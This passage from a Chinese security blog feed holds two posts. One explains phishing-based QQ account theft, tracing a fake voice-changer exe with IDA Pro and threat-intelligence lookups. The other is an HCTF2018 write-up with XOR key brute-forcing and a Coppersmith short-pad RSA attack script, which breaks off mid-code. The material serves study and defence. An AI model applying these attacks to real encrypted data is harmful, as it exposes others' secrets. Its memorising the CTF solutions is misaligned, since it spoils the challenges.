        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="追踪溯源-白话文讲盗号–科普篇"><a href="#追踪溯源-白话文讲盗号–科普篇" class="headerlink" title="追踪溯源_白话文讲盗号–科普篇"></a>追踪溯源_白话文讲盗号–科普篇</h1><blockquote><p>🆒一直一直以来，总是有人不断被盗qq，然后被用以恶意盗号者散播更多的恶意链接或者进行诈骗盈利活动，恶性循环，愈演愈烈，为了给同学们稍微科普一下基本的盗号原理，故有此文。</p><p>从扫二维码盗号，到模拟qq登录界面的钓鱼网站盗号，再到伪造qq在线文档诱导qq用户点击导致的盗号，总之盗号的方式各种各样，但都离不开一个重点，<strong>那就是你的账号是从你的设备上面传输给别人的</strong>（如果你没有到处宣扬你的密码的话😄），或是设备被植入木马，记录键盘输入，抑或是伪造页面使得用户主动输入账号密码等等等等。</p><p>既然知道，账号密码是从自己的设备上传到恶意盗号者手上的，那么问题就变得简单了。</p><p>接下来就从一个邮件钓鱼说起，事情是这样子的……</p></blockquote><h2 id="0x00-收到一封可爱的邮件"><a href="#0x00-收到一封可爱的邮件" class="headerlink" title="0x00 收到一封可爱的邮件"></a>0x00 收到一封可爱的邮件</h2><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120225806.png" alt=""></p><blockquote><p>邮件中有可爱的萌妹变声器，有福利小电影，游戏加速器的链接，可谓是吸引人极了，我们先去这个链接下载一个萌妹变声器玩一下。</p><p>这是一个十分典型的exe文件，一般稍微有些基础素养的人都不会随便点开这种exe文件的哦。比exe文件更容易中招的是文档文件，如doc文档，恶意人员可能会利用如office的漏洞，当你点开他精心制作的文档的时候，就会触发如宏病毒，远程代码执行等问题，正中人下怀。</p></blockquote><p>虚拟机是个好东西呢，如果你有什么东西非要冒着风险去运行一下，那么不如装个虚拟机先试试水，这次分析我们就在一个win7的虚拟机中进行。</p><h2 id="0x01-使用工具（IDA-Pro）-进行简单的静态分析"><a href="#0x01-使用工具（IDA-Pro）-进行简单的静态分析" class="headerlink" title="0x01 使用工具（IDA Pro） 进行简单的静态分析"></a>0x01 使用工具（IDA Pro） 进行简单的静态分析</h2><p>其实都没怎么分析程序逻辑，因为。。。这程序太粗糙了。</p><p>下载萌妹变声器.exe后，可以先看看文件属性哦：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120230944.png" alt=""></p><p>文件大小仅有707kb，一个变声器你觉得只需要707kb大小吗？很明显不止的好不好，毕竟变声器这么秀的玩意儿是吧。</p><p>先用PC hunter监控一下运行该文件之前，我们的网络情况（进程，服务等信息）：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120231308.png" alt=""></p><p>双击运行一下<code>萌妹变声器.exe</code>，emmm事实是因为虚拟机中缺少一些文件导致无法运行，正常情况下运行之后基本上是可以看到会有多出来的异常进程，而这个进程会对某个ip或者域名进行连接，传输窃取的信息等等。</p><p>那么接下来直接分析吧，IDA Pro反汇编：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120232154.png" alt=""></p><p>可以看到，通过反汇编之后，程序内部的一些信息以汇编代码的形式展开，但是我们既然是以白话文的形式来讲这篇科普文章，那肯定不是分析代码咯，只要明白这个流程就行啦。</p><p>接下来我们可以使用IDA pro的<code>shift + f12</code>快捷键来提取这个<code>萌妹变声器.exe</code>中的一些字符串，来看看有没有可疑的明显的线索。</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120232604.png" alt=""></p><p>很简单就看到了一些关键字眼，如<code>Connection==&gt;连接||Pipe==&gt;管道||Hostname==&gt;主机名</code>等信息。当然，更高级一点的软件或者钓鱼程序不会像这个这么粗糙，至少会给关键字符串加密，加壳或者加反调试措施，这都是后话了（估计小白听不懂）。</p><p>那么再细细找找，能不能找到该钓鱼程序散布者的踪迹呢？</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120233000.png" class="lazyload"></p><p>果不其然，IP地址拿到了，去看一眼喏：</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120233142.png" class="lazyload"></p><h2 id="0x02-简单地追踪溯源"><a href="#0x02-简单地追踪溯源" class="headerlink" title="0x02 简单地追踪溯源"></a>0x02 简单地追踪溯源</h2><p>上面的那个url是一个用来接收窃取到的信息的接口，那么通过现有的信息，我们如何深一步追踪溯源到这位可爱的程序散布者呢？</p><p>当然是威胁情报分析平台走一波咯（如VT，微步），其实我们一开始就可以把该exe文件上传到威胁检测平台进行检测（平台可以对URL，MD5，IP等等信息进行关联查询），但是为了情节需要，先细细分析一下文件，那么我们现在要做的是用威胁情报平台查找得到的IP关联信息：</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120233709.png" class="lazyload"></p><p>实际上用最开始邮箱中收到的那个域名也一样，我们可以看看关联的文件检测信息：</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120233930.png" class="lazyload"></p><p>可以看到检测到了威胁，具有一定的危险性：</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120234058.png" class="lazyload"></p><p>其实接下来就可以对该IP进行更深入的了解了（攻击是不可能攻击的，顶多扫描扫描目录，扫描目录我也是没有扫的）因为下面得到的几个url就够我们找到那个可爱的人了：</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120234312.png" class="lazyload"></p><p>访问一下这些url：</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120234500.png" class="lazyload"></p><p>嗯差不多就得了，我们也就不打扰人家了吧。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><blockquote><p>总之就是，恶意链接少点去点开啦，就算点开了，没有赋予权限，或者你没有主动输入账号密码，再或者是你没有网络，都基本不会导致被盗号的啦。</p><p>恶意文件自己需要好好分辨咯，就从上面的方法我们基本上就可以避免恶意文件了，但是恶意文档还是需要注意，虽然恶意文档的针对性，伪造难度比较高，但是不排除某天你就被针对了，你说是吧？🤣</p></blockquote><p>若有不符，还望斧正。</p><p>Published by Yof3ng.</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 追踪溯源 </tag>
            
            <tag> 信息安全 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>HCTF2018_学习记录</title>
      <link href="/2018/11/13/HCTF2018-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>/2018/11/13/HCTF2018-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="HCTF2018-学习记录"><a href="#HCTF2018-学习记录" class="headerlink" title="HCTF2018_学习记录"></a>HCTF2018_学习记录</h1><blockquote><p>重整旗鼓再上路😭，hctf没太重视(其实重视了也不会做)，只能赛后看看师傅们的writeup学习一波。接下来打算学一下基础的密码学，不然老是懵逼可没用呢。</p></blockquote><p>参考链接：</p><p><a href="https://xz.aliyun.com/t/3257#toc-17" target="_blank" rel="noopener">HCTF2018_CNSS_WP</a></p><p><a href="https://xz.aliyun.com/t/3256#toc-21" target="_blank" rel="noopener">HCTF2018_ 天枢 _WP</a></p><p><a href="https://xz.aliyun.com/t/3253#toc-23" target="_blank" rel="noopener">HCTF2018_Eur3kA_WP</a></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="crypto1-Xor-game"><a href="#crypto1-Xor-game" class="headerlink" title="crypto1 - Xor_game"></a>crypto1 - Xor_game</h3><blockquote><p>题目给出了一个cipher.txt装有密文，以及一个加密脚本，内容如下：</p><p>cipher.txt:</p><pre class=" language-python"><code class="language-python">ciMbOQxffx0GHQtSBB0QSQIORihXVQAUOUkHNgQLVAQcAVMAAAMCASFEGQYcVS8BNh8BGAoHFlMAABwCTSVQC2UdMQx5FkkGEQQAAVMAAQtHRCNLF0NSORscMkkaHABSExIYBQseUmBCFgtSKwEWfwELFRcGbzwEDABHVS8DDAcXfwUcMQwCDUUBCgYYSQEBATNKGwQeOkkbPhsYERYGDB0TYzwCUSVCDE8dKh0BNg4GAAkLSVMWHBpHQCxQF08AOhkWPh1OAA0XRQQRBQJKQyVKFghSMA95Gh8LGhEHBB8YEE4UViFaEQEVfwAdfx0GEUUWAAARGxpHTiFQERx4FkkROgUHERMXRTpUCANtYy9RFk8TLEkHNwxOFhcbAhsASR0STC1GCk8UMwYEOhsdfiEdRR0bHU4QSDRLHR0XO0kGMQ0LEgATERYQSQgORDJaWAsXMgYdfxsbGAB4LRYVGxpHUyFXHU8TMQ1TPRsLFREaDB0TSRoIASJGGR1SKwEWfwUBFQFSChVUHQYCASNWFQ0XLRocMgxkNgoAABd<span class="token operator">+</span>PRkIKwkDEAoTLQ1TKwELVAgHFhoXRU4BUy9OWBsaOkkeMAYAVAQcAVMXCBwEQDNQci4HJwAfNggcDUUXHQcGDAMCASFGCxsaOh0aPAAdGUUQBBoASRoIASNCCBsHLQxTMgAdABx4IxoYBQcJRmBXEApSNgcHOgcdEUUeDBURRU4FVDQDGQMBMEkVNgUCHQsVRQccDE4XVDJGcjsaOhsWfwgcEUUTCQQVEB1HTCVOFx0bOhpTKwEcGxAVDRwBHU4TSSUDHQ4AKwF5FkkMEQkbAAURSSdHQC0pPAYXO0kSLEkaHABSFAYdDBpHQyVCDRsLfwYVfwgbABAfC1MYDA8RRDMpKwcXMQ5TNhpOGgoGRRAcCAEUDWBQFQAZOkkUOhoaARcXbzYCDABHVilPDE8TMxocfxsLAAQbCxYQSQwITyUDCB0dKg0fJkk<span class="token operator">/</span>HQsVRTURBwlHTDVQGwMXVSYQPBwCAG8mDQERDGQuAShGGR1SMwYFOkVOPUUQAB8dDBgCASlNWAMdKQx5EwYYEUUbFlMVSR4ITiwDFwlSLB0BKg4JGAwcAlMWBRsCDCdRHQocfwgfOAgLfiQBRRcRGgELQDRGWAIbPBsccgsbBhYGRRwSSRkOTyQpOgMXOg0aMQ5OAA0ACgYTAU4KWGBVHQYcLGMqOggcB0UBERIAAAEJRCQDEQFSKwEWfwsLGAwXA3kyBhsVKwkDGgoeNgwFOkkaHAQGRRIYBU4EQC4DEAoTLWM2KQwAVAQcERoXAB4GVSUDHAYBPBsWKwxCVCxSCBYASRoPRGBMDAcXLUkHNwwHBkUdEh1<span class="token operator">+</span>OgEKRGBAGQFSMQYHfw4cFRYCRQccDE4KTi1GFht4EwwVK0kaG0UGDRZULA8UVWBXF08VMEkkOhoaWEUGDRZUDQsGRWBODRwGfwccK0kcEREHFx1UHQFHTy9UEAoAOmMgOgxCVCxSEhYVG049QC4DPgMdKAwBLEkBGkUfHFMcDA8DDWBKFk8UKgUffwsCGwofRRIYBgAAATRLHU8FPhBTPgUCVBEaAFMDCBdtZzJGCRoXMR0fJkkDHRYBABdUGgEKRGwDGhoGfwgfLAZOEAAXFR8NSQMIVyVHWA0Lfx4aMQ1CVAMACgAARU4UTy9UWAAAfxsSNgdkMgwEAHkkGw8NTyEDKA4APgQaKwhCVBYdCh1UCB1HUi9MFk8TLGMfNg8LVAcXRRERCBsTSCZWFE8eNgIWfxobGQgXF1MSBQEQRDJQWA4cO0kXOggaHEUeDBgRSQ8SVTVOFk8eOggFOhpkNQkBClMXCBwCASFBFxoGfx4bPh1OHAQB</code></pre><p>challenge.py:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#challenge.py</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>strxor <span class="token keyword">import</span> strxor<span class="token keyword">import</span> base64<span class="token keyword">import</span> random<span class="token keyword">def</span> <span class="token function">enc</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token punctuation">(</span>key <span class="token operator">*</span> <span class="token punctuation">(</span>len<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">/</span> len<span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span>len<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> strxor<span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span>poem <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'poem.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">"hctf{xxxxxxxxxxx}"</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'cipher.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>enc<span class="token punctuation">(</span>poem<span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; 通过简单分析其逻辑，可以知道xor_key就是flag花括号中的内容，通过该xor_key对poem.txt中的内容进行加密，并且需要对应长度。因为poem.txt中是一首诗，诗中可能会出现字母，数字，引号，换行等等合法字符，由于我们只有密文，并且知道xor的规律，是xor_key的长度来决定的，那么就可以通过遍历加上简单的判断，写出如下代码(这是最简单的解法，参照<a href="https://xz.aliyun.com/t/3257#toc-17" target="_blank" rel="noopener">电子科大CNSS战队的wp</a> ）：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#exp.py</span><span class="token keyword">import</span> base64<span class="token comment" spellcheck="true">#检测是否为诗歌正常字符</span><span class="token keyword">def</span> <span class="token function">invalid</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> chr<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token string">'{}[]@#%^*=+'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token comment" spellcheck="true">#换行符为正常字符</span>    <span class="token keyword">if</span> x <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> x <span class="token operator">&lt;=</span> <span class="token number">31</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span>cipher <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>open<span class="token punctuation">(</span><span class="token string">'cipher.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 可能的xor_key长度</span><span class="token keyword">for</span> L <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    cc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#对xor_key的每一位进行枚举</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">:</span>        t <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> cand <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token comment" spellcheck="true">#步长为xor_key长度，进行测试</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>i<span class="token punctuation">,</span> len<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">,</span> L<span class="token punctuation">)</span><span class="token punctuation">:</span>                tmp <span class="token operator">=</span> cand <span class="token operator">^</span> cipher<span class="token punctuation">[</span>j<span class="token punctuation">]</span>                <span class="token comment" spellcheck="true">#若不为正常字符，则将flag标志位置为False,不会将该ascii作为可能的xor_key字符</span>                <span class="token keyword">if</span> invalid<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">:</span>                    flag <span class="token operator">=</span> <span class="token boolean">False</span>                    <span class="token keyword">break</span>            <span class="token comment" spellcheck="true">#将符合条件的ascii对应的字符添加到对应xor_key字符位置的列表</span>            <span class="token keyword">if</span> flag<span class="token punctuation">:</span>                t<span class="token punctuation">.</span>append<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>cand<span class="token punctuation">)</span><span class="token punctuation">)</span>        c<span class="token punctuation">.</span>append<span class="token punctuation">(</span>len<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span>        cc<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token number">0</span> <span class="token operator">not</span> <span class="token keyword">in</span> c<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>L<span class="token punctuation">,</span> c<span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> cc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>运行效果：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113163611.png" alt=""></p><p>这虽然不是最精确的方法，但可以说是简便高效了，还有就是通过xortool来爆破key的长度，以及可能的字符串。或者查看<a href="https://xz.aliyun.com/t/3256#toc-22" target="_blank" rel="noopener">汉明码原理</a>。</p><p>通过xortool瞬间得到key长度最可能为21（记得密文需要是base64解密后的真正内容）：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113170451.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113172004.png" alt=""></p><p>的确可以看到爆破出来的key大多数不成形，比较难猜出，不过得到了key的长度就比较简单了。</p><h3 id="crypto2-Xor-RSA"><a href="#crypto2-Xor-RSA" class="headerlink" title="crypto2 - Xor?RSA"></a>crypto2 - Xor?RSA</h3><blockquote><p>这题涉及到RSA的一种攻击方式：padding过短，可以利用Coppersmith’s short-pad attack。</p><p><a href="https://www.anquanke.com/post/id/84632" target="_blank" rel="noopener">CTF中RSA常见攻击方法</a></p><p><a href="https://www.anquanke.com/post/id/158944" target="_blank" rel="noopener">浅析RSA Padding Attack-一叶飘零</a></p><p>题目源码：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> SocketServer<span class="token keyword">import</span> string<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> random<span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">from</span> flag <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">class</span> <span class="token class-name">ThreadedTCPServer</span><span class="token punctuation">(</span>SocketServer<span class="token punctuation">.</span>ThreadingMixIn<span class="token punctuation">,</span> SocketServer<span class="token punctuation">.</span>TCPServer<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">class</span> <span class="token class-name">RSATCPHandler</span><span class="token punctuation">(</span>SocketServer<span class="token punctuation">.</span>BaseRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">handle</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"Welcome to flag getting system\ngive me your token > "</span><span class="token punctuation">)</span>        token <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token operator">not</span> verify<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"token error\n"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            p <span class="token operator">=</span> getStrongPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>            q <span class="token operator">=</span> getStrongPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>            n <span class="token operator">=</span> p <span class="token operator">*</span> q            e <span class="token operator">=</span> <span class="token number">5</span>            nbits <span class="token operator">=</span> size<span class="token punctuation">(</span>n<span class="token punctuation">)</span>            kbits <span class="token operator">=</span> nbits <span class="token operator">//</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> e <span class="token operator">*</span> e<span class="token punctuation">)</span>            m1 <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span>nbits<span class="token punctuation">)</span>            m2 <span class="token operator">=</span> m1 <span class="token operator">^</span> getRandomNBitInteger<span class="token punctuation">(</span>kbits<span class="token punctuation">)</span>            c1 <span class="token operator">=</span> pow<span class="token punctuation">(</span>m1<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>            c2 <span class="token operator">=</span> pow<span class="token punctuation">(</span>m2<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"n="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"c1="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>c1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"c2="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>c2<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"now give me you answer\n"</span><span class="token punctuation">)</span>            ans1 <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            ans2 <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> str<span class="token punctuation">(</span>ans1<span class="token punctuation">)</span> <span class="token operator">==</span> str<span class="token punctuation">(</span>m1<span class="token punctuation">)</span> <span class="token operator">and</span> str<span class="token punctuation">(</span>ans2<span class="token punctuation">)</span> <span class="token operator">==</span> str<span class="token punctuation">(</span>m2<span class="token punctuation">)</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"wrong answer\n"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    HOST<span class="token punctuation">,</span> PORT <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> <span class="token number">10086</span>    server <span class="token operator">=</span> ThreadedTCPServer<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">,</span> RSATCPHandler<span class="token punctuation">)</span>    server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113173105.png" alt=""></p><p>这种目前比较常见的密码学出题方式，之前上海第四届大学生网络安全竞赛中也是类似的形式。</p><p>根据网上Coppersmith’s short-pad attack的sage脚本计算得到m1,m2从而getflag:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#.sage文件</span><span class="token keyword">def</span> <span class="token function">short_pad_attack</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    PRxy<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token punctuation">,</span>y<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    PRx<span class="token punctuation">.</span><span class="token operator">&lt;</span>xn<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    PRZZ<span class="token punctuation">.</span><span class="token operator">&lt;</span>xz<span class="token punctuation">,</span>yz<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    g1 <span class="token operator">=</span> x<span class="token operator">^</span>e <span class="token operator">-</span> c1    g2 <span class="token operator">=</span> <span class="token punctuation">(</span>x<span class="token operator">+</span>y<span class="token punctuation">)</span><span class="token operator">^</span>e <span class="token operator">-</span> c2    q1 <span class="token operator">=</span> g1<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>PRZZ<span class="token punctuation">)</span>    q2 <span class="token operator">=</span> g2<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>PRZZ<span class="token punctuation">)</span>    h <span class="token operator">=</span> q2<span class="token punctuation">.</span>resultant<span class="token punctuation">(</span>q1<span class="token punctuation">)</span>    h <span class="token operator">=</span> h<span class="token punctuation">.</span>univariate_polynomial<span class="token punctuation">(</span><span class="token punctuation">)</span>    h <span class="token operator">=</span> h<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>PRx<span class="token punctuation">)</span><span class="token punctuation">.</span>subs<span class="token punctuation">(</span>y<span class="token operator">=</span>xn<span class="token punctuation">)</span>    h <span class="token operator">=</span> h<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>    kbits <span class="token operator">=</span> n<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>e<span class="token operator">*</span>e<span class="token punctuation">)</span>    diff <span class="token operator">=</span> h<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># find root &lt; 2^kbits with factor >= n^0.5</span>    <span class="token keyword">return</span> diff<span class="token keyword">def</span> <span class="token function">related_message_attack</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> diff<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    PRx<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    g1 <span class="token operator">=</span> x<span class="token operator">^</span>e <span class="token operator">-</span> c1    g2 <span class="token operator">=</span> <span class="token punctuation">(</span>x<span class="token operator">+</span>diff<span class="token punctuation">)</span><span class="token operator">^</span>e <span class="token operator">-</span> c2    <span class="token keyword">def</span> <span class="token function">gcd</span><span class="token punctuation">(</span>g1<span class="token punctuation">,</span> g2<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token 